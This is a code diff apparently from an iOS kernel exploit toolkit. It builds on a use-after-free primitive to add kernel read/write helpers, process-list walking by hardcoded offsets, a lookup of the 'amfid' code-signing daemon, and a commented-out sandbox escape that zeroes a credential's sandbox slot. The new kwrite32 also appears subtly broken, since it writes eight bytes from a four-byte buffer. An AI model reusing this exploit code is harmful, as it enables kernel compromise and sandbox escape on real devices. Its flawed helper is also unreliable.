@@ -190,13 +190,61 @@ uint64_t kread64(u64 kfd, uint64_t where) {
 }
 
 void kwrite32(u64 kfd, uint64_t where, uint32_t what) {
-    uint32_t _what = what;
-    kwrite(kfd, &_what, where, sizeof(uint32_t));
+    u32 _buf[1] = {};
+    _buf[0] = what;
+    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
 }
 void kwrite64(u64 kfd, uint64_t where, uint64_t what) {
-    uint64_t _what = what;
-    kwrite(kfd, &_what, where, sizeof(uint64_t));
+    u64 _buf[1] = {};
+    _buf[0] = what;
+    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
 }
+
+uint64_t getProc(u64 kfd, pid_t pid) {
+    uint64_t proc = ((struct kfd*)kfd)->info.kaddr.kernel_proc;
+    
+    while (true) {
+        if(kread32(kfd, proc + 0x60/*PROC_P_PID_OFF*/) == pid) {
+            return proc;
+        }
+        proc = kread64(kfd, proc + 0x8/*PROC_P_LIST_LE_PREV_OFF*/);
+    }
+    
+    return 0;
+}
+
+uint64_t getProcByName(u64 kfd, char* nm) {
+    uint64_t proc = ((struct kfd*)kfd)->info.kaddr.kernel_proc;
+    
+    while (true) {
+        uint64_t nameptr = proc + 0x381;//PROC_P_NAME_OFF;
+        char name[32];
+        kread(kfd, nameptr, &name, 32);
+//        printf("[i] pid: %d, process name: %s\n", kread32(kfd, proc + 0x60), name);
+        if(strcmp(name, nm) == 0) {
+            return proc;
+        }
+        proc = kread64(kfd, proc + 0x8);//PROC_P_LIST_LE_PREV_OFF);
+    }
+    
+    return 0;
+}
+
+int getPidByName(u64 kfd, char* nm) {
+    return kread32(kfd, getProcByName(kfd, nm) + 0x60);//PROC_P_PID_OFF);
+}
+
+//bool escapeSandboxForProcess(u64 kfd, uint64_t proc){
+//    uint64_t proc_ro = kread64(kfd, proc + 0x18);
+//    uint64_t ucreds = kread64(kfd, proc_ro + 0x20);
+//    uint64_t cr_label_pac = kread64(kfd, ucreds + 0x78);
+//    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
+//    printf("[i] cr_label: 0x%llx\n", cr_label);
+//    uint64_t sandbox_slot = kread64(kfd, cr_label + 0x10);
+//    printf("[i] sandbox_slot: 0x%llx\n", sandbox_slot);
+//    kwrite64(kfd, cr_label + 0x10/*SANDBOX_SLOT_OFF*/, 0);
+//    return false;
+//}
 
 u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
 {
@@ -222,6 +270,14 @@ u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
     printf("[i] Kernel slide: 0x%llx\n", kslide);
     uint64_t kheader64 = kread64(kfd, kbase);
     printf("[i] Kernel base kread64 ret: 0x%llx\n", kheader64);
+    
+    pid_t myPid = getpid();
+    uint64_t selfProc = getProc(kfd, myPid);
+    printf("[i] self proc: 0x%llx\n", selfProc);
+    
+    pid_t amfidPid = getPidByName(kfd, "amfid");
+    uint64_t amfidProc = getProc(kfd, amfidPid);
+    printf("[i] amfid proc: 0x%llx\n", amfidProc);
     
     puaf_cleanup(kfd);
 
